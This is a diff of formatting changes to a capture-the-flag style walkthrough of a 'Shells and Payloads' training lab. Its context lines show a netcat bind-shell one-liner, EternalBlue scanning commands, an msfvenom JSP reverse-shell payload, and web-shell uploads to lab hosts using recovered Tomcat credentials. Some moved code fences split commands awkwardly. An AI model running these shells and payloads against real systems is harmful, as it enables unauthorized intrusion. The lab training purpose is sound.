@@ -80,8 +80,8 @@ and then we will be requested to enter the password.
 For windows – we will use xfreerdp with the command:
 ```bash
 xfreerdp /v:<Target IP> /u:<username> /p:<password>
-```
 /dynamic-resolution
+```
 to RDP connect to the machine.
 Throughout the module, those steps will be referred as 'login to the
 Linux/Windows target machine'.
@@ -148,8 +148,8 @@ rm -f /tmp/f;
 mkfifo /tmp/f;
 ```bash
 cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target-IP> 4444 >
-```
 /tmp/f
+```
 
 
 Now the bind shell on the target machine is awaiting for connections. Lets
@@ -205,7 +205,7 @@ nc -lnvp 4444
 
 
 now we need the reverse shell payload, lets go to the website:
-https://www.revshells.com/
+`https://www.revshells.com/`
 and set the attacker IP and the netcat listener port:
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/shells-and-payloads/p006_01.jpg)
@@ -387,8 +387,8 @@ and determine if our target is indeed vulnerable to 'Eternal Blue':
 ```bash
 use auxiliary/scanner/smb/smb_ms17_010
 set RHOSTS <target-IP>
-```
 run
+```
 
 
 ```bash
@@ -513,12 +513,12 @@ sudo nano /etc/hosts
 ```
 
 and within the file we add:
-<target-IP> status.inlanefreight.local
+`<target-IP>` status.inlanefreight.local
 
 
 and save (ctrl+X, and confirm with 'y').
 now lets go to the website:
-http://status.inlanefreight.local
+`http://status.inlanefreight.local`
 
 ![Figure 17.1 — Lab execution and output verification (Page 17)](/assets/images/posts/htb-academy/shells-and-payloads/p017_01.jpg)
 *_Figure 17.1 — Lab execution and output verification (Page 17)_*
@@ -564,7 +564,7 @@ Now that the file is ready, lets upload it to the website:
 
 
 Now that the file is uploaded, lets go in the browser to:
-http://status.inlanefreight.local//files/shell.aspx
+`http://status.inlanefreight.local//files/shell.aspx`
 
 ![Figure 19.1 — Lab execution and output verification (Page 19)](/assets/images/posts/htb-academy/shells-and-payloads/p019_01.jpg)
 *_Figure 19.1 — Lab execution and output verification (Page 19)_*
@@ -617,7 +617,7 @@ Answer: iis apppool\status
 Method: for this question we will link the vhost 'status.inlanefreight.local' to
 the target IP in the same manner described in the previous section.
 When that's done, let go to
-http://status.inlanefreight.local
+`http://status.inlanefreight.local`
 
 getting to the same page from the previous question, we will prepare the
 '/usr/share/nishang/Antak-WebShell/antak.aspx' file to be uploaded, in a
@@ -647,7 +647,7 @@ When modified – we upload the file:
 
 
 When the file is uploaded, we go in the URL to:
-http://status.inlanefreight.local//files/antak.aspx
+`http://status.inlanefreight.local//files/antak.aspx`
 and enter the credentials:
 
 ![Figure 22.1 — Lab execution and output verification (Page 22)](/assets/images/posts/htb-academy/shells-and-payloads/p022_01.jpg)
@@ -701,7 +701,7 @@ the file name of the gif in the /images/vendor directory on the target? (Format:
 xxxx.gif)
 Answer: ajax-loader.gif
 Method: lets begin by entering the ip in the browser, https protocol:
-https://10.129.68.11/
+`https://10.129.68.11/`
 advanced → accept the risk and continue:
 
 We get to rconfig login page.
@@ -757,7 +757,7 @@ Then hit 'Forward' (several clicks may be required).
 
 'Added new vendor webshell to Database'
 Now we turn off the interceptor, go back to the browser and navigate to:
-https://10.129.68.11/images/vendor/webshell.php
+`https://10.129.68.11/images/vendor/webshell.php`
 
 
 Here is the web shell.
@@ -859,7 +859,7 @@ enabled. Lets try to access it from the browser:
 
 ### Lets open it
 
-http://172.16.1.11:8080/
+`http://172.16.1.11:8080/`
 
 
 We get to tomcat service  - version 10.0.11.
@@ -880,7 +880,7 @@ Lets open it:
 
 We have credentials for tomcat management – 'tomcat:Tomcatadm'.
 Back to the browser – lets to go
-http://172.16.1.11:8080/manager/html
+`http://172.16.1.11:8080/manager/html`
 
 
 We are requested to enter credentials, lets enter the credentials we obtained:
@@ -901,7 +901,7 @@ And more importantly – we can deploy one of our own, in 'WAR' format:
 
 #### Technical Methodology & Exploit Execution:
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker-IP>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=`<attacker-IP>`
 LPORT=<listening port> -f war > backup.war
 where in our case attacker IP will be the foothold IP - '172.16.1.5', and the
 listening port will be 4444:
@@ -1015,7 +1015,7 @@ and we add '172.16.1.12 blog.inlanefreight.local'
 
 Now that the subdomain is linked to the IP , lets enter the subdomain in the
 browser:
-http://blog.inlanefreight.local/
+`http://blog.inlanefreight.local/`
 
 we get to this blog of 'Slade Wilson':
 
